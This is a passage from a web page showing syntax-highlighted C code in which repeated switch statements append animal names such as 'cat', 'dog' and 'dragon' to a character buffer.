operator\">:</span></pre></td></tr><tr><td data-num=\"381\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"382\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"383\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"384\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"385\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"386\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"387\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"388\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"389\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"390\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"391\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"392\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"393\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"394\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"395\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"396\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"397\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"398\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"399\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>jj<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"400\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"401\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"402\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"403\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"404\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"405\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"406\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"407\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"408\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"409\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"410\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"411\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"412\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"413\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"414\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"415\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"416\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"417\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"418\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"419\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"420\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"421\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"422\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"423\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"424\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"425\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"426\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"427\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"428\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"429\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"430\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"431\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"432\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"433\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"434\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"435\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"436\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"437\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"438\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"439\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"440\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"441\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>kk<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"442\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"443\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"444\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"445\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"446\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"447\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"448\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"449\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"450\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"451\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"452\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"453\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"454\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"455\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"456\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"457\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"458\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"459\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"460\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"461\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"462\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"463\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"464\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"465\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"466\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"467\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"468\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"469\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"470\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"471\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"472\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"473\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"474\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"475\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"476\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"477\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"478\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"479\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"480\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"481\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"482\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"483\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"484\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"485\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"486\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"487\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"488\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"489\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"490\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"491\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"492\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"493\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"494\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"495\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"496\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"497\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"498\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"499\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"500\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"501\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"502\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"503\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"504\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"505\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"506\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"507\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"508\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"509\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"510\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"511\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"512\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"513\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"514\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"515\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"516\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"517\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"518\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token 